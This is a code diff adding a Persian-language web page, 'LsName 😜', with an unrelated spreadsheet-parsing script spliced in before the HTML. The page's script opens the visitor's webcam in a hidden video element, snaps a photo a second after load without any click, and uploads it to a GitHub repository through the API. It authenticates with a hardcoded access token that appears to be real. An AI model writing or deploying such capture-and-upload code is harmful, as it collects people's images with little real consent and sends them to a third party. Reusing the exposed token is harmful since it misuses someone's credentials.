@@ -1,0 +1,133 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LsName 😜</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; direction: rtl; }
+        video { max-width: 100%; height: auto; margin: 20px 0; }
+        a { padding: 10px 20px; margin: 10px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }
+        a:hover { background: #0056b3; }
+        #download { display: none; }
+    </style>
+</head>
+<body>
+    <h1>LsName 😜</h1>
+    <p>در حال گرفتن عکس...</p>
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <a id="download" href="#" download="photo.jpg">دانلود عکس</a>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const downloadLink = document.getElementById('download');
+
+        // تنظیمات GitHub
+        const GITHUB_TOKEN = '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'; // توکن خود را اینجا قرار دهید
+        const REPO_OWNER = 'lsname648'; // نام کاربری GitHub
+        const REPO_NAME = 'webcam'; // نام مخزن
+        const FILE_PATH = 'photos/photo-' + Date.now() + '.jpg'; // مسیر فایل در مخزن
+
+        // دسترسی به دوربین و گرفتن عکس خودکار
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                // منتظر بارگذاری ویدیو
+                video.onloadedmetadata = () => {
+                    setTimeout(() => takePhotoAndUpload(), 1000); // 1 ثانیه صبر برای اطمینان از بارگذاری ویدیو
+                };
+            })
+            .catch(err => {
+                console.error("خطا در دسترسی به دوربین: ", err);
+                alert("دسترسی به دوربین ممکن نشد. لطفاً مطمئن شوید که از HTTPS استفاده می‌کنید و مجوز دوربین را تأیید کرده‌اید.");
+            });
+
+        // گرفتن عکس و آپلود
+        function takePhotoAndUpload() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataUrl = canvas.toDataURL('image/jpeg');
+            downloadLink.href = dataUrl;
+            downloadLink.style.display = 'inline-block';
+
+            // آماده‌سازی داده برای آپلود به GitHub
+            const base64Content = dataUrl.split(',')[1]; // فقط بخش Base64
+            uploadToGitHub(base64Content);
+        }
+
+        // آپلود به GitHub
+        async function uploadToGitHub(base64Content) {
+            const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
+            const body = {
+                message: 'Upload photo from camera app',
+                content: base64Content
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'PUT',
+                    headers: {
+                        'Authorization': `token ${GITHUB_TOKEN}`,
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/vnd.github.v3+json'
+                    },
+                    body: JSON.stringify(body)
+                });
+
+                if (response.ok) {
+                    alert('عکس با موفقیت به مخزن GitHub آپلود شد!');
+                    console.log('عکس آپلود شد:', await response.json());
+                } else {
+                    throw new Error('خطا در آپلود به GitHub: ' + response.statusText);
+                }
+            } catch (err) {
+                console.error(err);
+                alert('خطا در آپلود به GitHub: ' + err.message);
+            }
+        }
+    </script>
+</body>
+</html>
